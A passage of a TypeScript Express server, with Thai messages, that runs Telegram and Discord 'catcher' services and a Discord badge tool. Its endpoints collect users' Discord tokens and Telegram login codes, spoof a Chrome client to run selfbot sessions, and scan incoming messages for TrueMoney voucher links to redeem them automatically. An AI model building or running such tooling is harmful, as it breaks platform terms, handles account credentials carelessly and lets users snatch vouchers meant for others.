                                      pushTgLog(telegramPhone, `❌ ${result?.status?.message || 'ไม่สามารถรับได้'}`);
                                  }
                              } catch(e) {
                                  pushTgLog(telegramPhone, `❌ ข้อผิดพลาดในการรับซอง`);
                              }
                          }
                      }
                  }
              }, new NewMessage({}));
              
          }).catch((e: any) => {
              const sessData = tgSessions.get(telegramPhone);
              if (sessData) {
                  sessData.status = 'error';
                  sessData.logs.push(`ข้อผิดพลาดการเชื่อมต่อ: ${e.message}`);
              }
          });

          // Respond immediately
          res.json({ success: true, status: 'idle' });
          
      } catch (err: any) {
          res.status(500).json({ error: String(err) });
      }
  });

  app.post('/api/telegram/catcher/submit', async (req, res) => {
      const { telegramPhone, type, value } = req.body;
      const sess = tgSessions.get(telegramPhone);
      if (!sess) return res.status(400).json({ error: 'ไม่พบเซสชั่น' });

      if (type === 'otp' && sess.resolveOtp) {
          sess.resolveOtp(value);
          sess.status = 'idle';
      } else if (type === 'password' && sess.resolvePassword) {
          sess.resolvePassword(value);
          sess.status = 'idle';
      }
      
      res.json({ success: true });
  });

  app.get('/api/telegram/catcher/status', async (req, res) => {
      const phone = req.query.phone as string;
      const sess = tgSessions.get(phone);
      if (!sess) return res.json({ status: 'none', logs: [] });
      res.json({ status: sess.status, logs: sess.logs });
  });

  app.post('/api/telegram/catcher/stop', async (req, res) => {
      const { telegramPhone } = req.body;
      const sess = tgSessions.get(telegramPhone);
      if (sess) {
          try { await sess.client.disconnect(); } catch (e) {}
          tgSessions.delete(telegramPhone);
      }
      res.json({ success: true });
  });

  app.post('/api/truemoney/redeem', async (req, res) => {
    try {
      const { url, phone } = req.body;
      if (!url || !phone) return res.status(400).json({ error: 'Missing parameters' });
      const result = await twApi(url, phone);
      res.json(result);
    } catch (err: any) {
      res.status(500).json({ error: err.message || String(err) });
    }
  });

  // --- Discord Token On Service ---
  const discordTokenOnSessions = new Map<string, {
      ws: WebSocket,
      status: 'idle' | 'connected' | 'error',
      logs: string[]
  }>();

  function pushDiscordOnLog(token: string, msg: string) {
      const sess = discordTokenOnSessions.get(token);
      if (sess) {
          sess.logs.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
          if (sess.logs.length > 50) sess.logs.shift();
      }
  }

  app.post('/api/discord/token-on/start', async (req, res) => {
      const { discordToken, isPremium } = req.body;
      if (!discordToken) return res.status(400).json({ error: 'Missing token' });

      try {
          let sess = discordTokenOnSessions.get(discordToken);
          if (sess && sess.status === 'connected') {
             return res.json({ status: 'connected' });
          }

          const ws = new WebSocket('wss://gateway.discord.gg/?encoding=json&v=9&compress=json');
          
          sess = { 
              ws, 
              status: 'idle', 
              logs: ['🎯 เริ่มระบบ Token On (24/7)...']
          };
          discordTokenOnSessions.set(discordToken, sess);

          let hbInterval: NodeJS.Timeout | null = null;

          ws.on('open', () => {
              sess!.status = 'connected';
              pushDiscordOnLog(discordToken, '✅ เชื่อมต่อ Discord Gateway สำเร็จ! ไอดีของคุณออนไลน์แล้ว');
              // Identify Payload
              ws.send(JSON.stringify({
                  "op": 2,
                  "d": {
                      "token": discordToken,
                      "capabilities": 253,
                      "properties": {
                          "os": "Windows",
                          "browser": "Chrome",
                          "device": "",
                          "system_locale": "en-US",
                          "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36",
                          "browser_version": "96.0.4664.113",
                          "os_version": "10",
                          "referrer": "",
                          "referring_domain": "",
                          "referrer_current": "",
                          "referring_domain_current": "",
                          "release_channel": "stable",
                          "client_build_number": 109190,
                          "client_event_source": null
                      },
                      "presence": {
                          "status": "online",
                          "since": 0,
                          "activities": [],
                          "afk": false
                      },
                      "compress": false
                  }
              }));
          });

          ws.on('message', async (data: any) => {
              const payload = JSON.parse(data);
              
              if (payload.op === 10) {
                  const heartbeatInterval = payload.d.heartbeat_interval;
                  hbInterval = setInterval(() => {
                      if (ws.readyState === WebSocket.OPEN) {
                           ws.send(JSON.stringify({ op: 1, d: null }));
                      }
                  }, heartbeatInterval);
              }
              
              if (payload.t === 'READY') {
                  pushDiscordOnLog(discordToken, `✅ ยืนยันตัวตนสำเร็จ: ${payload.d.user.username}#${payload.d.user.discriminator}`);
              }
          });

          ws.on('close', () => {
              if (hbInterval) clearInterval(hbInterval);
              const curSess = discordTokenOnSessions.get(discordToken);
              if (curSess) {
                 curSess.status = 'error';
                 pushDiscordOnLog(discordToken, '❌ ตัดการเชื่อมต่อจาก Discord Gateway แล้ว');
              }
          });

          ws.on('error', (err: any) => {
              const curSess = discordTokenOnSessions.get(discordToken);
              if (curSess) {
                  curSess.status = 'error';
                  pushDiscordOnLog(discordToken, `❌ ข้อผิดพลาด WebSocket: ${err.message}`);
              }
          });

          // Respond immediately
          res.json({ success: true, status: 'idle' });
          
      } catch (err: any) {
          res.status(500).json({ error: String(err) });
      }
  });

  app.get('/api/discord/token-on/status', async (req, res) => {
      const token = req.query.token as string;
      const sess = discordTokenOnSessions.get(token);
      if (!sess) return res.json({ status: 'none', logs: [] });
      res.json({ status: sess.status, logs: sess.logs });
  });

  app.post('/api/discord/token-on/stop', async (req, res) => {
      const { discordToken } = req.body;
      const sess = discordTokenOnSessions.get(discordToken);
      if (sess) {
          try { sess.ws.close(); } catch (e) {}
          discordTokenOnSessions.delete(discordToken);
      }
      res.json({ success: true });
  });

  // --- Discord Gift Catcher Service ---
  const discordSessions = new Map<string, {
      ws: WebSocket,
      status: 'idle' | 'connected' | 'error',
      truemoneyPhone: string,
      logs: string[]
  }>();

  function pushDiscordLog(token: string, msg: string) {
      const sess = discordSessions.get(token);
      if (sess) {
          sess.logs.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
          if (sess.logs.length > 50) sess.logs.shift();
      }
  }

  app.post('/api/discord/catcher/request', async (req, res) => {
      const { discordToken, truemoneyPhone, isPremium } = req.body;
      if (!discordToken || !truemoneyPhone) return res.status(400).json({ error: 'Missing token or phone number' });

      // Daily Limit logic (shared with telegram or separate if prefered, using tgDailyCount for simplicity if not premium)
      const today = new Date().toISOString().slice(0, 10);
      if (tgLastResetDate !== today) {
          tgLastResetDate = today;
          tgDailyCount = 0;
      }

      if (!isPremium) {
          if (tgDailyCount >= 100) {
              return res.status(400).json({ error: 'โควต้าผู้ใช้งานฟรีเต็มแล้วสำหรับวันนี้ (100 คน) กรุณากลับมาใหม่พรุ่งนี้ หรืออัปเกรด VIP' });
          }
          tgDailyCount++;
      }

      try {
          let sess = discordSessions.get(discordToken);
          if (sess && sess.status === 'connected') {
             return res.json({ status: 'connected' });
          }

          const ws = new WebSocket('wss://gateway.discord.gg/?encoding=json&v=9&compress=json');
          
          sess = { 
              ws, 
              status: 'idle', 
              truemoneyPhone,
              logs: ['เริ่มเชื่อมต่อเข้าสู่ระบบ Discord (WebSocket)...']
          };
          discordSessions.set(discordToken, sess);

          let hbInterval: NodeJS.Timeout | null = null;

          ws.on('open', () => {
              sess!.status = 'connected';
              pushDiscordLog(discordToken, 'เชื่อมต่อ Gateway สำเร็จ กำลังรอรับข้อความซอง...');
              // Identify Payload
              ws.send(JSON.stringify({
                  "op": 2,
                  "d": {
                      "token": discordToken,
                      "capabilities": 253,
                      "properties": {
                          "os": "Windows",
                          "browser": "Chrome",
                          "device": "",
                          "system_locale": "en-US",
                          "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36",
                          "browser_version": "96.0.4664.113",
                          "os_version": "10",
                          "referrer": "",
                          "referring_domain": "",
                          "referrer_current": "",
                          "referring_domain_current": "",
                          "release_channel": "stable",
                          "client_build_number": 109190,
                          "client_event_source": null
                      },
                      "compress": false
                  }
              }));
          });

          ws.on('message', async (data: any) => {
              const payload = JSON.parse(data);
              if (payload.t === 'MESSAGE_CREATE') {
                  const message = payload.d.content;
                  if (message) {
                      const voucherRegex = /https?:\/\/gift\.truemoney\.com\/campaign\/?(?:voucher_detail\/)?\?v=([A-Za-z0-9]+)/gi;
                      const matches = message.match(voucherRegex);
                      
                      if (matches && matches.length > 0) {
                          pushDiscordLog(discordToken, `🎯 เจอซอง! เริ่มการรับเครดิตเข้าเบอร์ ${truemoneyPhone}`);
                          for (const vurl of matches) {
                              try {
                                  const result = await twApi(vurl, truemoneyPhone);
                                  if (result?.status?.code === 'SUCCESS') {
                                      pushDiscordLog(discordToken, `✅ รับซองสำเร็จ! +${result.data.my_ticket.amount_baht} บาท`);
                                  } else {
                                      // @ts-ignore
                                      pushDiscordLog(discordToken, `❌ ${result?.status?.message || 'ไม่สามารถรับได้'}`);
                                  }
                              } catch(e) {
                                  pushDiscordLog(discordToken, `❌ ข้อผิดพลาดในการรับซอง`);
                              }
                          }
                      }
                  }
              }

              if (payload.op === 10) {
                  const heartbeatInterval = payload.d.heartbeat_interval;
                  hbInterval = setInterval(() => {
                      if (ws.readyState === WebSocket.OPEN) {
                           ws.send(JSON.stringify({ op: 1, d: null }));
                      }
                  }, heartbeatInterval);
              }
          });

          ws.on('close', () => {
              if (hbInterval) clearInterval(hbInterval);
              const curSess = discordSessions.get(discordToken);
              if (curSess) {
                 curSess.status = 'error';
                 pushDiscordLog(discordToken, '❌ ตัดการเชื่อมต่อจาก Discord Gateway แล้ว');
              }
          });

          ws.on('error', (err: any) => {
              const curSess = discordSessions.get(discordToken);
              if (curSess) {
                  curSess.status = 'error';
                  pushDiscordLog(discordToken, `❌ ข้อผิดพลาด WebSocket: ${err.message}`);
              }
          });

          // Respond immediately
          res.json({ success: true, status: 'idle' });
          
      } catch (err: any) {
          res.status(500).json({ error: String(err) });
      }
  });

  app.get('/api/discord/catcher/status', async (req, res) => {
      const token = req.query.token as string;
      const sess = discordSessions.get(token);
      if (!sess) return res.json({ status: 'none', logs: [] });
      res.json({ status: sess.status, logs: sess.logs });
  });

  app.post('/api/discord/catcher/stop', async (req, res) => {
      const { discordToken } = req.body;
      const sess = discordSessions.get(discordToken);
      if (sess) {
          try { sess.ws.close(); } catch (e) {}
          discordSessions.delete(discordToken);
      }
      res.json({ success: true });
  });

  // Discord HypeSquad Tool API
  app.post('/api/discord/hypesquad', async (req, res) => {
    try {
      const { token, house_id } = req.body;
      if (!token) return res.status(400).json({ error: 'Token is required' });
      if (![1, 2, 3].includes(house_id)) return res.status(400).json({ error: 'Invalid house_id' });

      const response = await axios.post('https://discord.com/api/v9/hypesquad/online', 
        { house_id },
        { 
          headers: { 
            'Authorization': token,
            'Content-Type': 'application/json'
          }
        }
      );

      if (response.status === 204 || response.status === 200) {
        res.json({ success: true, message: 'รับตราสำเร็จ' });
      } else {
        res.status(response.status).json({ error: 'เกิดข้อผิดพลาดในการรับตรา', details: response.data });
      }
    } catch (error: any) {
      console.error("Discord hypesquad error:", error.response?.data || error.message);
      res.status(error.response?.status || 500).json({ 
        error: error.response?.data?.message || "ไม่สามารถเชื่อมต่อกับ Discord ได้ ลองตรวจสอบ Token อีกครั้งหรือบัญชีอาจจะติด Flag" 
      });
    }
  });

  app.delete('/api/discord/hypesquad', async (req, res) => {
    try {
      const { token } = req.body;
      if (!token) return res.status(400).json({ error: 'Token is required' });

      // In Axios, DELETE with body might require { data: ... } or pass token in headers
      const response = await axios.delete('https://discord.com/api/v9/hypesquad/online', {
        headers: { 
          'Authorization': token,
          'Content-Type': 'application/json'
        }
      });

      if (response.status === 204 || response.status === 200) {
        res.json({ success: true, message: 'ลบตราสำเร็จ' });
      } else {
        res.status(response.status).json({ error: 'เกิดข้อผิดพลาดในการลบตรา', details: response.data });
      }
    } catch (error: any) {
      console.error("Discord hypesquad remove error:", error.response?.data || error.message);
      res.status(error.response?.status || 500).json({ 
        error: error.response?.data?.message || "ไม่สามารถเชื่อมต่อกับ Discord ได้ ลองตรวจสอบ Token อีกครั้ง" 
      });
    }
  });

if (!process.env.VERCEL) {
  if (process.env.NODE_ENV !== "production") {
    console.log("Initializing Vite middleware (async)...");
    try {
      const { createServer: createViteServer } = await import('vite');
      const vite = await createViteServer({
        server: { middlewareMode: true },
        appType: "spa",
      });
      app.use(vite.middlewares);
      console.log("Vite middleware attached.");
    } catch (err) {
      console.error("Failed to initialize Vite middleware:", err);
    }
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath, { 
      maxAge: '1y',
      setHeaders: (res, path) => {
        if (path.endsWith('.html')) {
          res.setHeader('Cache-Control', 'no-cache');
        }
      }
    }));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(3000, "0.0.0.0", () => {
    console.log(`[Server] Listening on http://0.0.0.0:3000`);
  });
}
export default app;

